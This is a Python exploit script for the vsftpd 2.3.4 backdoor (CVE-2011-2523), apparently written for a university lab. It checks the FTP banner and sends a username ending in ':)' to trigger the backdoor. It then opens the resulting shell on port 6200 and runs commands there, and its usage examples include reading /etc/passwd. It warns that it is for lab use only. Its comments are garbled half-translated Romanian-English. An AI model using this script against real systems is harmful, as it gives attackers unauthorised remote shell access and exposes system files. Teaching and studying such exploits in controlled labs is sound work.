#!/usr/bin/env python3
"""
================================================================================
Exploit: vsftpd 2.3.4 Backdoor (CVE-2011-2523)
================================================================================
S13 - IoT and Security in Computer Networks

PEDAGOGICAL OBJECTIVES:
1. Understanding anatomiei unui exploit real
2. Lucrul with socketuri for communication of nivel scazut
3. Automatizarea procesului of exploatare
4. Constientizarea pericolului serviceslor vulnerabile

CONTEXT ISTORIC:
- Versiunea vsftpd 2.3.4 a fost publicata in iulie 2011 with un backdoor
- Backdoor-ul a fost introdus of un attacker which a compromis serverul of build
- Un username which contains caracterele ":)" deschide un shell on portul 6200
- Vulnerabilitya a fost descoperita quick and versiunea a fost retrasa

FLUX EXPLOIT:
1. Connection at servicel FTP (port 21/2121)
2. Sendre USER with sufixul ":)"
3. Sendre PASS (any value)
4. Connection at portul backdoor (6200)
5. Execution commands in shell-ul obtinut

USAGE:
    python3 ftp_backdoor_vsftpd.py --target 10.0.13.12 --ftp-port 2121
    python3 ftp_backdoor_vsftpd.py --target 10.0.13.12 --command "id; whoami; cat /etc/passwd"

ETHICAL WARNING:
    This script is EXCLUSIV for environment of laboratory controlat!
================================================================================
"""

from __future__ import annotations 

import argparse 
import socket 
import sys 
import time 
from typing import Optional ,Tuple 

# ==============================================================================
# CONSTANTE
# ==============================================================================

class Colors :
    RED ="\033[91m"
    GREEN ="\033[92m"
    YELLOW ="\033[93m"
    BLUE ="\033[94m"
    CYAN ="\033[96m"
    MAGENTA ="\033[95m"
    RESET ="\033[0m"
    BOLD ="\033[1m"


    # Configurari implicite
DEFAULT_FTP_PORT =2121 
DEFAULT_BACKDOOR_PORT =6200 
DEFAULT_TIMEOUT =5.0 
BACKDOOR_TRIGGER =":)"# Caracterele which activeeaza backdoor-ul


# ==============================================================================
# FUNCTII EXPLOIT
# ==============================================================================

def check_vsftpd_version (host :str ,port :int ,timeout :float )->Tuple [bool ,str ]:
    """
    Check if servicel FTP is vsftpd 2.3.4.
    
    Returns:
        Tuple (is_vulnerable, banner_string)
    """
    try :
        sock =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )
        sock .settimeout (timeout )
        sock .connect ((host ,port ))

        # Citim bannerul FTP
        banner =sock .recv (1024 ).decode ("utf-8",errors ="replace").strip ()
        sock .close ()

        # Checkm versiunea
        is_vulnerable ="2.3.4"in banner .lower ()
        return is_vulnerable ,banner 

    except Exception as e :
        return False ,f"Error: {e}"


def trigger_backdoor (
host :str ,
port :int ,
timeout :float ,
verbose :bool =True 
)->bool :
    """
    Activeeaza backdoor-ul through sendrea username-ului special.
    
    TECHNICAL EXPLANATION:
    - Serverul vsftpd 2.3.4 check username-ul for caracterele ":)"
    - If are gasite, start un listener on portul 6200
    - This comportament a fost introdus malitios in codul sursa
    
    Returns:
        True if backdoor-ul a fost activeat with success
    """
    if verbose :
        print (f"\n{Colors.BLUE}[*] Etapa 1: Connection at FTP ({host}:{port}){Colors.RESET}")

    try :
        sock =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )
        sock .settimeout (timeout )
        sock .connect ((host ,port ))

        # ========================================
        # STUDENT SECTION - Trigger backdoor
        # ========================================

        # Citim bannerul FTP
        banner =sock .recv (1024 ).decode ("utf-8",errors ="replace").strip ()
        if verbose :
            print (f"    {Colors.GREEN}Banner: {banner}{Colors.RESET}")

            # Sendm USER with trigger-ul backdoor
            # Username-ul must sa contina ":)" for a activea backdoor-ul
        payload_user =f"USER exploit{BACKDOOR_TRIGGER}\r\n"
        if verbose :
            print (f"\n{Colors.BLUE}[*] Etapa 2: Sendre username malitios{Colors.RESET}")
            print (f"    Payload: USER exploit{Colors.YELLOW}{BACKDOOR_TRIGGER}{Colors.RESET}")

        sock .sendall (payload_user .encode ())
        time .sleep (0.2 )

        # Citim responseul (331 Please specify password)
        response =sock .recv (1024 ).decode ("utf-8",errors ="replace").strip ()
        if verbose :
            print (f"    Response: {response}")

            # Sendm PASS (valoarea not conteaza)
        payload_pass ="PASS anything\r\n"
        if verbose :
            print (f"\n{Colors.BLUE}[*] Etapa 3: Sendre password{Colors.RESET}")
            print (f"    Payload: PASS anything")

        sock .sendall (payload_pass .encode ())
        time .sleep (0.3 )

        # Not more asteptam response - serverul ar putea sa not raspunda
        # deoarece backdoor-ul modify flow-ul normal

        sock .close ()

        if verbose :
            print (f"\n    {Colors.GREEN}[✓] Backdoor trigger sent with success{Colors.RESET}")

        return True 

    except socket .timeout :
        if verbose :
            print (f"    {Colors.YELLOW}[!] Timeout - serverul not a response{Colors.RESET}")
        return False 

    except ConnectionRefusedError :
        if verbose :
            print (f"    {Colors.RED}[✗] Connection refuseda{Colors.RESET}")
        return False 

    except Exception as e :
        if verbose :
            print (f"    {Colors.RED}[✗] Error: {e}{Colors.RESET}")
        return False 


def connect_backdoor (
host :str ,
port :int ,
timeout :float ,
command :Optional [str ]=None ,
verbose :bool =True 
)->Optional [str ]:
    """
    Se connect at shell-ul backdoor and execute commands.
    
    Args:
        host: Adresa IP target
        port: Portul backdoor (default 6200)
        timeout: Timeout connection
        command: Comanda of executat (None for shell interactive)
        verbose: Display messages detaliate
    
    Returns:
        Output-ul commandsi or None if esueaza
    """
    if verbose :
        print (f"\n{Colors.BLUE}[*] Etapa 4: Connection at backdoor ({host}:{port}){Colors.RESET}")

    try :
        sock =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )
        sock .settimeout (timeout )
        sock .connect ((host ,port ))

        if verbose :
            print (f"    {Colors.GREEN}[✓] Connected at backdoor shell!{Colors.RESET}")

        if command :
        # ========================================
        # STUDENT SECTION - Execution command
        # ========================================

        # Executem comanda furnizata
            if verbose :
                print (f"\n{Colors.BLUE}[*] Etapa 5: Execution command{Colors.RESET}")
                print (f"    Command: {command}")

                # Sendm comanda + newline
            sock .sendall (f"{command}\n".encode ())
            time .sleep (0.5 )

            # Citim output-ul
            output =b""
            sock .settimeout (1.0 )# Timeout more scurt for citire

            while True :
                try :
                    chunk =sock .recv (4096 )
                    if not chunk :
                        break 
                    output +=chunk 
                except socket .timeout :
                    break 

            sock .close ()

            result =output .decode ("utf-8",errors ="replace").strip ()

            if verbose :
                print (f"\n{Colors.CYAN}┌──────────────────────────────────────────┐{Colors.RESET}")
                print (f"{Colors.CYAN}│ OUTPUT BACKDOOR SHELL                    │{Colors.RESET}")
                print (f"{Colors.CYAN}└──────────────────────────────────────────┘{Colors.RESET}")
                for line in result .split ("\n"):
                    print (f"  {line}")

            return result 

        else :
        # Mod interactive (mini-shell)
            if verbose :
                print (f"\n{Colors.YELLOW}[i] Mod shell interactive (Ctrl+C for iesire){Colors.RESET}")
                print (f"{Colors.CYAN}{'─'*50}{Colors.RESET}")

            try :
                while True :
                    cmd =input (f"{Colors.GREEN}backdoor@{host}${Colors.RESET} ")
                    if cmd .lower ()in ["exit","quit"]:
                        break 

                    sock .sendall (f"{cmd}\n".encode ())
                    time .sleep (0.3 )

                    sock .settimeout (1.0 )
                    try :
                        response =sock .recv (4096 ).decode ("utf-8",errors ="replace")
                        print (response ,end ="")
                    except socket .timeout :
                        pass 

            except KeyboardInterrupt :
                print (f"\n{Colors.YELLOW}[i] Iesire shell interactive{Colors.RESET}")

            sock .close ()
            return None 

    except socket .timeout :
        if verbose :
            print (f"    {Colors.RED}[✗] Timeout - backdoor-ul not raspunde{Colors.RESET}")
            print (f"    {Colors.YELLOW}    Possible ca trigger-ul not a functionat{Colors.RESET}")
        return None 

    except ConnectionRefusedError :
        if verbose :
            print (f"    {Colors.RED}[✗] Connection refuseda on portul {port}{Colors.RESET}")
            print (f"    {Colors.YELLOW}    Backdoor-ul not is activee or portul not e expus{Colors.RESET}")
        return None 

    except Exception as e :
        if verbose :
            print (f"    {Colors.RED}[✗] Error: {e}{Colors.RESET}")
        return None 


def run_exploit (
host :str ,
ftp_port :int =DEFAULT_FTP_PORT ,
backdoor_port :int =DEFAULT_BACKDOOR_PORT ,
command :Optional [str ]=None ,
timeout :float =DEFAULT_TIMEOUT ,
verbose :bool =True 
)->bool :
    """
    Running exploitul complete.
    
    Returns:
        True if exploitul a successful
    """
    if verbose :
        print (f"\n{Colors.CYAN}{'═'*60}")
        print (f"  EXPLOIT: vsftpd 2.3.4 Backdoor (CVE-2011-2523)")
        print (f"  Target: {host}:{ftp_port}")
        print (f"{'═'*60}{Colors.RESET}")

        # Pasul 0: Checkm versiunea
    if verbose :
        print (f"\n{Colors.BLUE}[*] Etapa 0: Verification version vsftpd{Colors.RESET}")

    is_vulnerable ,banner =check_vsftpd_version (host ,ftp_port ,timeout )

    if verbose :
        if is_vulnerable :
            print (f"    {Colors.GREEN}[✓] Version vulnerabila detectata!{Colors.RESET}")
        else :
            print (f"    {Colors.YELLOW}[!] Version unknowna: {banner}{Colors.RESET}")
            print (f"    {Colors.YELLOW}    Continuem oricum...{Colors.RESET}")

            # Pasul 1-3: Activeam backdoor-ul
    if not trigger_backdoor (host ,ftp_port ,timeout ,verbose ):
        return False 

        # Asteptam ca backdoor-ul sa se activeeze
    time .sleep (0.5 )

    # Pasul 4-5: Ne conectam at backdoor
    result =connect_backdoor (host ,backdoor_port ,timeout ,command ,verbose )

    if result is not None or command is None :
        if verbose :
            print (f"\n{Colors.GREEN}{'═'*60}")
            print (f"  [✓] EXPLOIT REUSIT!")
            print (f"{'═'*60}{Colors.RESET}")
        return True 

    return False 


    # ==============================================================================
    # MAIN
    # ==============================================================================

def main ():
    parser =argparse .ArgumentParser (
    description ="Exploit vsftpd 2.3.4 backdoor for laboratory S13",
    formatter_class =argparse .RawDescriptionHelpFormatter ,
    epilog ="""
Examples:
  %(prog)s --target 10.0.13.12 --ftp-port 2121
  %(prog)s --target 10.0.13.12 --command "id; whoami"
  %(prog)s --target 10.0.13.12 --command "cat /etc/passwd | head -5"
        """
    )

    parser .add_argument ("--target",required =True ,
    help ="Adresa IP target")
    parser .add_argument ("--ftp-port",type =int ,default =DEFAULT_FTP_PORT ,
    help =f"Port FTP (default: {DEFAULT_FTP_PORT})")
    parser .add_argument ("--backdoor-port",type =int ,default =DEFAULT_BACKDOOR_PORT ,
    help =f"Port backdoor (default: {DEFAULT_BACKDOOR_PORT})")
    parser .add_argument ("--command",
    help ="Command of executat (default: shell interactive)")
    parser .add_argument ("--timeout",type =float ,default =DEFAULT_TIMEOUT ,
    help =f"Timeout connection (default: {DEFAULT_TIMEOUT}s)")
    parser .add_argument ("--quiet",action ="store_true",
    help ="Minimal output")

    args =parser .parse_args ()

    # Avertisment etic
    if not args .quiet :
        print (f"\n{Colors.RED}{'!'*60}")
        print (f"  AVERTISMENT: This exploit is ONLY for laboratory!")
        print (f"  Utilizarea on systems without authorisation is ILEGALA!")
        print (f"{'!'*60}{Colors.RESET}")

        # Rulam exploitul
    success =run_exploit (
    host =args .target ,
    ftp_port =args .ftp_port ,
    backdoor_port =args .backdoor_port ,
    command =args .command ,
    timeout =args .timeout ,
    verbose =not args .quiet 
    )

    sys .exit (0 if success else 1 )


if __name__ =="__main__":
    main ()
